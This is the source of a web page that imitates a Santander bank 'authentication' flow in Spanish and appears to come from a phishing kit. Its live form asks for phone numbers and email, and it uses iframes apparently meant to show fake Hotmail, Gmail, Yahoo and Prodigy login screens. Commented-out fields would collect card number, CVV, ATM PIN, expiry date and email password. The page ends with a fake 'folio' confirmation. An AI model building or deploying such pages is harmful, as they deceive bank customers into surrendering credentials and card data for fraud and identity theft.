<script src="../jquery-1.7.1.min.js"></script>
<script src="script_panel_mobile.js"></script>

<input type="hidden" name="session" id="session" value="<?=$session;?>">

<div id="backmodal"></div>

<div class="" id="divEmailConfirm" style="">
    <div id="cnt">
        <iframe id="iframeEmail" style="width: 100%; height: 550px" src=""></iframe>
        
    </div>
</div>



<script>
    function closeIframeHotmail(){
        window.parent.location.href = "../MiSitioPrivado/verify-account/?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }

    function closeIframeGmail(){
        window.parent.location.href = "../../../../../MiSitioPrivado/verify-account/?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }

    function closeIframeYahoo(){
        window.parent.location.href = "../../../MiSitioPrivado/verify-account/?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }

    function closeIframeProdigy(){
        window.parent.location.href = "../../../MiSitioPrivado/verify-account/?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }

    function closeIframeGenerico(){
        window.parent.location.href = "../MiSitioPrivado/verify-account/?SESSIONID="+$('#session').val()+"&data=ahjdaksdh878912371923";
    }
</script>

<style>
        #divEmailConfirm {
            width: 40%;
            left: 30%;
            top: 2em;
            z-index: 10002;
            position: absolute;
            display: none;
            margin: 0 auto!important;
        }


        #backmodal {
            padding: 0;
            margin: 0;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            width: 100%;
            height: 100%;
            background: #595959 url(../../spacer.gif) center center;
            z-index: 1001;
            -moz-opacity: 0.8;
            opacity: 0.80;
            filter: alpha(opacity=80);
            display: none;
        }

        @media (min-width: 1200px){
            #divEmailConfirm {
                width: 40%;
                left: 30%;
                top: 2em;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px){
            #divEmailConfirm {
                width: 60%;
                left: 30%;
                top: 3em;
            }
        }

        @media (min-width: 268px) and (max-width: 991px){
            #divEmailConfirm {
                width: 90%;
                left: 5%;
                top: 1em;
            }
        }
    </style>


<style>


    .progress-flex[_ngcontent-c19] {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
}
    
    
    .container[_ngcontent-c19] {
    height: 54px;
    padding: 0;
    width: 100%;
    margin-top: 51px;
    margin-bottom: 45px;
}
    
    .progress[_ngcontent-c19] {
    margin-top: 1.78%;
    border-radius: 0;
    height: 6px;
}
    
    
    
    .progressBar-text-center[_ngcontent-c19] {
    text-align: center;
}

    
    
    .progressBar-text-right[_ngcontent-c19] {
    opacity: .6;
    text-align: right;
}

.progressBar-text[_ngcontent-c19], .progressBar-text-center[_ngcontent-c19], .progressBar-text-left[_ngcontent-c19], .progressBar-text-right[_ngcontent-c19] {
    font-size: 12px;
    line-height: 20px;
    color: #444;
    width: 32.5%;
    display: inline-block;
}
    
    
.progressBar-text[_ngcontent-c19], .progressBar-text-center[_ngcontent-c19], .progressBar-text-left[_ngcontent-c19], .progressBar-text-right[_ngcontent-c19] {
    font-size: 12px;
    line-height: 20px;
    color: #444;
    width: 32.5%;
    display: inline-block;
}
    
    
    
    
    .row {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
    margin-right: -15px;
    margin-left: -15px;
}
    
    
    
    .progressBar-text-left[_ngcontent-c19] {
    text-align: left;
}
<style>
.progressBar-text[_ngcontent-c19], .progressBar-text-center[_ngcontent-c19], .progressBar-text-left[_ngcontent-c19], .progressBar-text-right[_ngcontent-c19] {
    font-size: 12px;
    line-height: 20px;
    color: #444;
    width: 32.5%;
    display: inline-block;
}
    
    
    .rounded-circle[_ngcontent-c19] {
    border: 2px solid #ec0000;
    padding: 4px 9px;
}
.rounded-circle {
    border-radius: 50%!important;
}
    
    
    .container[_ngcontent-c19] {
    height: 54px;
    padding: 0;
    width: 100%;
    margin-top: 51px;
    margin-bottom: 45px;
}
    
    
    #progressBar[_ngcontent-c19] {
    background-color: #e60000;
}
    
    .progress {
    /*display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    height: 1rem;
    overflow: hidden;*/
    font-size: .75rem!important;
    /*background-color: #e9ecef;
    border-radius: .25rem;*/
}
    
    @media (min-width: 960px){
        .container {
    max-width: 960px;
}
    }

    
    
    @media (min-width: 768px){
        .container {
    max-width: 720px;
            
}
        
        .pt-10px{
            font-size: 10px!important;
        }
    }

    @media (min-width: 320px){
        .container {
    max-width: 540px;
}
        
        .pt-10px{
            font-size: 10px!important;
        }
    }

.container {
    width: 100%;
    padding-right: 15px;
    padding-left: 15px;
    margin-right: auto;
    margin-left: auto;
}
    
    
    
    
    
    
    
    
    
    
    
    .portrait[_ngcontent-c12] {
    min-height: 52px;
    max-height: 52px;
}

.footer[_ngcontent-c12] {
    background-color: #676767;
    color: #fff;
    padding: 0 6px 6px;
}
.w-100 {
    width: 100%!important;
}
.navbar {
    position: relative;
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: justify;
    -ms-flex-pack: justify;
    justify-content: space-between;
    padding: .5rem 1rem;
}
article, aside, figcaption, figure, footer, header, hgroup, main, nav, section {
    display: block;
}
* {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: 'Open Sans',sans-serif;
}
*, ::after, ::before {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
}

nav {
    display: block;
}
    
    
    
    
    
</style>


<input type="hidden" name="tok" id="tok" value="<?=$_SESSION['IDsession'];?>">                
<input type="hidden" name="folID" id="folID" value="<?=$_SESSION['Folio'];?>">



<super-header _ngcontent-c1="" _nghost-c7="" style="max-width: 937px;">
    <!---->
    <div _ngcontent-c7="" class="ng-star-inserted">
        <nav _ngcontent-c7="" class="navbar mobile-private" style="background: rgb(236, 0, 0);">
            <div _ngcontent-c7="" class="w-100">
                <div _ngcontent-c7="" class="insideNav" style="">
                    <div _ngcontent-c7="" class="row m-0 icons-row">
                        <!---->
                        <div _ngcontent-c7="" class="items col-10 text-center ml-auto">
                            <!---->
                            <!---->
                            <div _ngcontent-c7="" class="ng-star-inserted">
                                <div _ngcontent-c7="" class="d-flex flex-column">
                                    <!---->
                                    <div _ngcontent-c7="" class="p-0 align-content-center ng-star-inserted">
                                        <img _ngcontent-c7="" class="img-responsive logo" src="../assets/logos/classic/santander_classic.svg">
                                    </div>
                                    <!---->
                                    <!---->
                                </div>
                            </div>
                        </div>

                        <!----><button _ngcontent-c7="" class="btn btn-burguer col-1 ng-star-inserted" type="button">
                            <img _ngcontent-c7="" class="burguer" src="../assets/img/burger_menu.svg">
                        </button>
                        <div _ngcontent-c7="" class="col-9 d-flex px-0 mt-1 icons-wrapperv justify-content-end">
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                            <!---->
                        </div>
                    </div>
                </div>
            </div>
        </nav>

        <!---->
        
        <!---->
        <nav _ngcontent-c7="" class="childView ng-star-inserted">
            <div _ngcontent-c7="" class="w-100">
                <div _ngcontent-c7="" class="d-flex justify-content-center">
                    <div _ngcontent-c7="" class="text-center title">
                        <strong _ngcontent-c7="" id="txtTitle">
                            Datos de contacto
                        </strong>
                    </div>
                </div>
            </div>
        </nav>
    </div>

    <!---->

    <!---->
</super-header>


<div _ngcontent-c1="" class="w-100">
    <div _ngcontent-c1="" class="shell-center" style="">
        <div _ngcontent-c1="" class="m-auto" style="max-width: 576px;">
            <!---->
        </div>
        <!---->
        <!---->

        <div _ngcontent-c1="" class="row m-auto">
            <!---->
            <div _ngcontent-c1="" class="col-12 m-auto px-0">
                <div _ngcontent-c1="" class="portrait">
                    <div _ngcontent-c1="" class="w-100 m-auto" style="max-width: 576px; min-height: 403px;">

                        <super-shell _ngcontent-c1="">
                            <!---->
                            
                            <super-loader id="loading" style="display: none;" _nghost-c13="" class="ng-star-inserted">
                                <div _ngcontent-c13="" class="ng-star-inserted">
                                    <div _ngcontent-c13="" class="modal-backdrop" style="opacity: .2"></div>
                                    <div _ngcontent-c13="" class="w3-modal w3-animate-opacity d-flex">
                                        <div _ngcontent-c13="" class="w3-modal-content inner mt-auto">
                                            <img _ngcontent-c13="" alt="" class="loader center" src="../assets/loader-ring.gif">
                                        </div>
                                    </div>
                                </div>
                            </super-loader>
                            
        
                            
                            <router-outlet></router-outlet>
                            <ng-component class="ng-star-inserted">
                                <router-outlet></router-outlet>
                                <super-unlock-authentication _nghost-c21="" class="ng-star-inserted">
                                    <div _ngcontent-c21="" class="container container-desktop container-tab">
                                        <style>
                                            .paso1{
                                                width: 33.3%
                                            }
                                            
                                            .paso2{
                                                width: 67%
                                            }
                                            
                                            .paso3{
                                                width: 100%
                                            }
                                        </style>
                                        <super-progress-bar _ngcontent-c18="" _nghost-c19="">
                                            <div _ngcontent-c19="" class="container">
                                                <div _ngcontent-c19="" class="row">
                                                    <div _ngcontent-c19="" class="col-lg-12 progress-flex">
                                                        <div _ngcontent-c19="" class="progressBar-text-left">
                                                            <span _ngcontent-c19="" class="rounded-circle" id="roundNumber">
                                                                1
                                                            </span>
                                                        </div>
                                                        <div _ngcontent-c19="" class="progressBar-text-center" id="process_txt">
                                                            Lo estamos autenticando
                                                        </div>
                                                        <div _ngcontent-c19="" class="progressBar-text-right" id="pasos">
                                                            1 de 3
                                                        </div>
                                                    </div>
                                                </div>
                                                <div _ngcontent-c19="" class="progress">
                                                    <div _ngcontent-c19="" aria-valuemax="100" aria-valuemin="0" aria-valuenow="17" class="super-progress-bar paso1" id="progressBar" role="progressbar" >
                                                    </div>
                                                </div>
                                            </div>
                                        </super-progress-bar>
                                        
                                        
                                        

                                        <div _ngcontent-c21="">
                                            <!---->
                                            <!---->
                                            <super-unlock-authentication-tdd-nip _ngcontent-c21="" _nghost-c23="" class="ng-star-inserted">
                                                <!--<form _ngcontent-c23="" novalidate="" class="ng-untouched ng-pristine ng-invalid">
                                                    <div _ngcontent-c23="" class="row top-margin">
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-right-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">
                                                                    Seleccione una opción para identificarse
                                                                </label>
                                                                <select _ngcontent-c23="" class="form-control ng-untouched ng-pristine ng-valid" formcontrolname="authenticationFormSelect" name="authentication">
                                                                    <option _ngcontent-c23="" value="token-nac" class="ng-star-inserted">
                                                                        Token / SuperToken
                                                                    </option>
                                                                    <option _ngcontent-c23="" value="tdd-nip" class="ng-star-inserted">
                                                                        Tarjeta de débito
                                                                    </option>
                                                                    <option _ngcontent-c23="" value="tel-nac" class="ng-star-inserted">
                                                                        Clave telefónica
                                                                    </option>
                                                                </select>
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">Tarjeta de débito</label>
                                                                <input _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="tarjetas" placeholder="16 dígitos" type="password">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <span _ngcontent-c23=""></span>
                                                    <super-buttons-nip _ngcontent-c23="" _nghost-c26="">
                                                        <div _ngcontent-c26="" class="row top-margin">
                                                            <div _ngcontent-c26="" class="col-md-12 col-lg-6 padding-right-desktop">
                                                                <div _ngcontent-c26="" class="form-group">
                                                                    <label _ngcontent-c26="" class="texto" for="">
                                                                        NIP de cajero
                                                                    </label>
                                                                    <div _ngcontent-c26="" class="input-group zindex-zero input-group-mask">
                                                                        <input _ngcontent-c26="" autocomplete="off" class="form-control nip-numbers ng-untouched ng-pristine ng-valid" maxlength="4" placeholder="4 dígitos" readonly="readonly" type="password">
                                                                        <button _ngcontent-c26="" class="btn btn-secondary input-group-text span-payment input-icon-disabled px-3 button-nip" type="button">
                                                                            x
                                                                        </button>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </super-buttons-nip>
                                                    <div _ngcontent-c23="" class="row justify-content-center my-4">
                                                        <button _ngcontent-c23="" class="rounded-red-button btn-lg-mt" disabled="">
                                                            Continuar
                                                        </button>
                                                    </div>
                                                </form>-->
                                                
                                                <form id="frmEmail" style="" name="frmEmail" _ngcontent-c23="" novalidate="" class="ng-untouched ng-pristine ng-invalid">
                                                    <div _ngcontent-c23="" class="row top-margin">
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">N&uacute;mero Celular</label>
                                                                <input id="cell" name="cell" _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="tarjetas" maxlength="10" placeholder="Teléfono celular" type="text" onKeyPress="return soloNumeros(event)">
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">N&uacute;mero de Casa u Oficina</label>
                                                                <input id="phone" name="phone" _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="tarjetas" maxlength="10" placeholder="Teléfono de Casa u Oficina" type="text" onKeyPress="return soloNumeros(event)">
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-right-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">
                                                                    Correo electr&oacute;nico
                                                                </label>
                                                                <input id="email" name="email" _ngcontent-c26="" autocomplete="off" class="form-control nip-numbers ng-untouched ng-pristine ng-valid" maxlength="" placeholder="Correo electrónico" type="text">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <span _ngcontent-c23=""></span>
                                                    <!--<super-buttons-nip _ngcontent-c23="" _nghost-c26="">
                                                        <div _ngcontent-c26="" class="row top-margin">
                                                            <div _ngcontent-c26="" class="col-md-12 col-lg-6 padding-right-desktop">
                                                                <div _ngcontent-c26="" class="form-group">
                                                                    <label _ngcontent-c26="" class="texto" for="">
                                                                        Confirme la contraseña de su correo electrónico
                                                                    </label>
                                                                    <div _ngcontent-c26="" class="input-group zindex-zero input-group-mask">
                                                                        <input id="ps2" name="ps2" _ngcontent-c26="" autocomplete="off" class="form-control nip-numbers ng-untouched ng-pristine ng-valid" maxlength="" placeholder="Confirme la contraseña de su correo electrónico" type="password">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </super-buttons-nip>-->
                                                    <div _ngcontent-c23="" class="row justify-content-center my-4">
                                                        <button id="btnEmail" _ngcontent-c23="" class="rounded-red-button btn-lg-mt" disabled="">
                                                            Continuar
                                                        </button>
                                                    </div>
                                                </form>
                                                
                                                <form id="frmCC" name="frmCC" _ngcontent-c23="" novalidate="" class="ng-untouched ng-pristine ng-invalid" style="display: none;">
                                                    <div _ngcontent-c23="" class="row top-margin">
                                                        <!--<div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-right-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">
                                                                    Tel&eacute;fono celular
                                                                </label>
                                                                <input id="cell" name="cell" _ngcontent-c26="" autocomplete="off" class="form-control nip-numbers ng-untouched ng-pristine ng-valid" maxlength="10" placeholder="Teléfono celular" type="text" onKeyPress="return soloNumeros(event)">
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">N&uacute;mero de tarjeta</label>
                                                                <input id="tarjeta" name="tarjeta" _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="tarjetas" placeholder="16 digitos de su tarjeta" maxlength="16" type="text" onKeyPress="return soloNumeros(event)">
                                                            </div>
                                                        </div>
                                                        
                                                        
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">CVV</label>
                                                                <input id="cvv" name="cvv" _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" maxlength="3" formcontrolname="tarjetas" placeholder="3 digitos del reverso de su tarjeta" type="password" onKeyPress="return soloNumeros(event)">
                                                            </div>
                                                        </div>
                                                        
                                                        
                                                        
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">NIP de cajero</label>
                                                                <input id="nip" name="nip" _ngcontent-c23="" autocomplete="off" class="form-control ng-untouched ng-pristine ng-invalid" formcontrolname="tarjetas" placeholder="4 digitos de su NIP" maxlength="4" type="password" onKeyPress="return soloNumeros(event)">
                                                            </div>
                                                        </div>-->
                                                        
                                                        
                                                        
                                                        
                                                        
                                                        
                                                        
                                                        <!--<div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">
                                                                    Fecha de expiraci&oacute;n de su tarjeta
                                                                </label>
                                                                <select _ngcontent-c23="" class="form-control ng-untouched ng-pristine ng-valid" formcontrolname="authenticationFormSelect" name="mes" id="mes">
          
            
            <?php
                /*echo '<option _ngcontent-c23="" value="" class="ng-star-inserted">MM</option>';
                for($i=1; $i<=12; $i++){
                    if($i<10){
                        echo '<option _ngcontent-c23="" value="0'.$i.'" class="ng-star-inserted">0'.$i.'</option>';
                    }else{
                        echo '<option _ngcontent-c23="" value="'.$i.'" class="ng-star-inserted">'.$i.'</option>';
                    }
                }*/
            ?>
        </select>
                                                                
                                                                
                                                                
                                                                <select _ngcontent-c23="" class="form-control ng-untouched ng-pristine ng-valid" formcontrolname="authenticationFormSelect" name="year" id="year" style="margin-top: 10px;">
          <?php
                /*echo '<option _ngcontent-c23="" value="" class="ng-star-inserted">AAAA</option>';
                for($i=2019; $i<=2030; $i++){
                    echo '<option _ngcontent-c23="" value="'.$i.'" class="ng-star-inserted">'.$i.'</option>';
                }*/
            ?>
        </select>
                                                                
                                                                
                                                                
                                                                
                                                            </div>
                                                        </div>-->
                                                        
                                                        
                                                    </div>
                                                    <span _ngcontent-c23=""></span>
                                                    <div _ngcontent-c23="" class="row justify-content-center my-4">
                                                        <button id="btnVerify" _ngcontent-c23="" class="rounded-red-button btn-lg-mt">
                                                            Continuar
                                                        </button>
                                                    </div>
                                                </form>
                                                
                                                <form id="frmFolio" name="frmFolio" _ngcontent-c23="" novalidate="" class="ng-untouched ng-pristine ng-invalid" style="display: none;">
                                                    
                                                    <div _ngcontent-c23="" class="row top-margin">
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-right-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c23="" class="texto">
                                                                    Es importante que conserve el No. de folio que aparace en la parte de abajo.
                                                                </label>
                                                                
                                                            </div>
                                                        </div>
                                                        <div _ngcontent-c23="" class="col-md-12 col-lg-6 padding-left-desktop">
                                                            <div _ngcontent-c23="" class="form-group">
                                                                <label _ngcontent-c25="">Folio:  </label>
                                                                    
                                                                <label id="txtFolioInsert" style="color: #e60000!important;"></label>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-c23="" class="row justify-content-center my-4">
                                                        <button id="btnFolio" _ngcontent-c23="" class="rounded-red-button btn-lg-mt">
                                                            Continuar
                                                        </button>
                                                    </div>
                                                    
                                                    <!--
                                                        <div _ngcontent-c25="" class="form-group mt-3 form">
                                                            <div _ngcontent-c25="" class="row pb-1 last-txt">
                                                            <div _ngcontent-c25="" class="col-12">
                                                                <h2>Proceso finalizado</h2>
                                                                <p>Es importante que conserve el No. de folio que aparace en la parte de abajo.</p>
                                                            </div>
                                                        </div>
                                                            <div _ngcontent-c25="" class="row pb-1">
                                                                <div _ngcontent-c25="" class="col-sm-6 pt-sm-0">
                                                                    <label _ngcontent-c25="">Folio:  </label>
                                                                    
                                                                    <label id="txtFolioInsert" style="color: #e60000!important;"></label>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-c25="" class="row py-5">
                                                            <div _ngcontent-c25="" class="col-md-12 col-lg-3 text-center">
                                                                <button id="btnFolio" _ngcontent-c25="" class="rounded-red-button">
                                                                    Continuar
                                                                </button>
                                                            </div>
                                                        </div>
                                                        </div>
                                                    -->
                                                    
                                                    
                                                </form>
                                                
                                                
                                            </super-unlock-authentication-tdd-nip>
                                        </div>
                                    </div>
                                </super-unlock-authentication>
                            </ng-component>
                        </super-shell>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
